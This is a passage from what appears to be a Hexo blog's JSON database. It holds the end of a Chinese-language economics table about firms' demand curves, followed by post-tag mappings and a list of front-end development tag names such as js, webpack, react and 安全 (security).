style=\"text-align:center\">企业面临的需求曲线</td>\n<td style=\"text-align:center\">水平</td>\n<td style=\"text-align:center\">向右下方倾斜</td>\n<td style=\"text-align:center\">向右下方倾斜</td>\n</tr>\n</tbody>\n</table>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cj9ft3s2z0000l8slslwxrkin","tag_id":"cj9ft3s3e0002l8sloq69uryz","_id":"cj9ft3s4d000bl8sl58zjkapp"},{"post_id":"cj9ft3s2z0000l8slslwxrkin","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s4g000dl8slgeq2acbw"},{"post_id":"cj9ft3s3e0001l8sldmf4648j","tag_id":"cj9ft3s3u0009l8sl842ld992","_id":"cj9ft3s4g000jl8slf087x82o"},{"post_id":"cj9ft3s3e0001l8sldmf4648j","tag_id":"cj9ft3s4g000el8slacunxhr5","_id":"cj9ft3s4g000ll8sl7v559462"},{"post_id":"cj9ft3s3e0003l8sld9wyucis","tag_id":"cj9ft3s4g000hl8slmoeo2b38","_id":"cj9ft3s4v000rl8sldva21xm3"},{"post_id":"cj9ft3s3e0003l8sld9wyucis","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s4v000sl8sltc7idf40"},{"post_id":"cj9ft3s3e0003l8sld9wyucis","tag_id":"cj9ft3s4v000pl8sl9nz3wjhz","_id":"cj9ft3s4v000ul8sld2yin9qe"},{"post_id":"cj9ft3s3e0004l8sl9tzktdzd","tag_id":"cj9ft3s4v000ql8slrhntrqjb","_id":"cj9ft3s4v000wl8slmqqtu8id"},{"post_id":"cj9ft3s3e0004l8sl9tzktdzd","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s4v000xl8slprfq4a7y"},{"post_id":"cj9ft3s3u0005l8slwcfsr79t","tag_id":"cj9ft3s4v000vl8sla3gj3avy","_id":"cj9ft3s4v000zl8sl8xu150g7"},{"post_id":"cj9ft3s3u0007l8sl1lkrq6xn","tag_id":"cj9ft3s4v000yl8sl0q8yl20o","_id":"cj9ft3s5b0014l8slh78drdmz"},{"post_id":"cj9ft3s3u0007l8sl1lkrq6xn","tag_id":"cj9ft3s4v000vl8sla3gj3avy","_id":"cj9ft3s5b0015l8sltxlqxzx6"},{"post_id":"cj9ft3s3u0007l8sl1lkrq6xn","tag_id":"cj9ft3s5b0011l8sla5a7okhb","_id":"cj9ft3s5b0017l8slsp26czeo"},{"post_id":"cj9ft3s3u0007l8sl1lkrq6xn","tag_id":"cj9ft3s5b0012l8slbe0av2wj","_id":"cj9ft3s5b0018l8sl2sficzg3"},{"post_id":"cj9ft3s3u0008l8slluf9hatq","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s5b001al8slw9yqq8xy"},{"post_id":"cj9ft3s3u0008l8slluf9hatq","tag_id":"cj9ft3s5b0013l8sl75ws3qf4","_id":"cj9ft3s5r001bl8slsmaqu2pm"},{"post_id":"cj9ft3s4b000al8sl5885inkl","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s5r001el8slvk2wxz3c"},{"post_id":"cj9ft3s4b000al8sl5885inkl","tag_id":"cj9ft3s5b0016l8slnf8s4t9s","_id":"cj9ft3s5r001fl8slvu0zbpmg"},{"post_id":"cj9ft3s4b000al8sl5885inkl","tag_id":"cj9ft3s5b0019l8sle4o9l66m","_id":"cj9ft3s5r001hl8slzc20328v"},{"post_id":"cj9ft3s4b000al8sl5885inkl","tag_id":"cj9ft3s5r001cl8sl4rtep4y0","_id":"cj9ft3s5r001il8sl8hip3lwl"},{"post_id":"cj9ft3s4e000cl8slgmxthh5j","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s5r001kl8slfih2qtx8"},{"post_id":"cj9ft3s4e000cl8slgmxthh5j","tag_id":"cj9ft3s5r001dl8sldvnhvem1","_id":"cj9ft3s5r001ll8sl292uvnrs"},{"post_id":"cj9ft3s4g000fl8slxdr47irg","tag_id":"cj9ft3s3u0006l8slug3049oi","_id":"cj9ft3s5r001nl8sl09whia3e"},{"post_id":"cj9ft3s4g000fl8slxdr47irg","tag_id":"cj9ft3s3e0002l8sloq69uryz","_id":"cj9ft3s5r001ol8sldklf6al1"},{"post_id":"cj9ft3s4g000fl8slxdr47irg","tag_id":"cj9ft3s5r001gl8slq4dc1zpi","_id":"cj9ft3s5r001pl8sliy83x41d"},{"post_id":"cj9ft3s4g000ml8slp0ivxlnj","tag_id":"cj9ft3s4v000ql8slrhntrqjb","_id":"cj9ft3s5r001ql8sl9wtnust1"},{"post_id":"cj9ft3s4g000ml8slp0ivxlnj","tag_id":"cj9ft3s5r001ml8sl5s2v7b2a","_id":"cj9ft3s5r001rl8slv1txfp8g"}],"Tag":[{"name":"模块化","_id":"cj9ft3s3e0002l8sloq69uryz"},{"name":"js","_id":"cj9ft3s3u0006l8slug3049oi"},{"name":"响应式","_id":"cj9ft3s3u0009l8sl842ld992"},{"name":"CSS","_id":"cj9ft3s4g000el8slacunxhr5"},{"name":"jquery","_id":"cj9ft3s4g000hl8slmoeo2b38"},{"name":"源码分析","_id":"cj9ft3s4v000pl8sl9nz3wjhz"},{"name":"浏览器","_id":"cj9ft3s4v000ql8slrhntrqjb"},{"name":"html","_id":"cj9ft3s4v000vl8sla3gj3avy"},{"name":"node","_id":"cj9ft3s4v000yl8sl0q8yl20o"},{"name":"pug","_id":"cj9ft3s5b0011l8sla5a7okhb"},{"name":"模板引擎","_id":"cj9ft3s5b0012l8slbe0av2wj"},{"name":"数据类型","_id":"cj9ft3s5b0013l8sl75ws3qf4"},{"name":"webpack","_id":"cj9ft3s5b0016l8slnf8s4t9s"},{"name":"react","_id":"cj9ft3s5b0019l8sle4o9l66m"},{"name":"babel","_id":"cj9ft3s5r001cl8sl4rtep4y0"},{"name":"安全","_id":"cj9ft3s5r001dl8sldvnhvem1"},{"name":"面向对象","_id":"cj9ft3s5r001gl8slq4dc1zpi"},{"name":"css","_id":"cj9ft3s5r001ml8sl5s2v7b2a"}]}}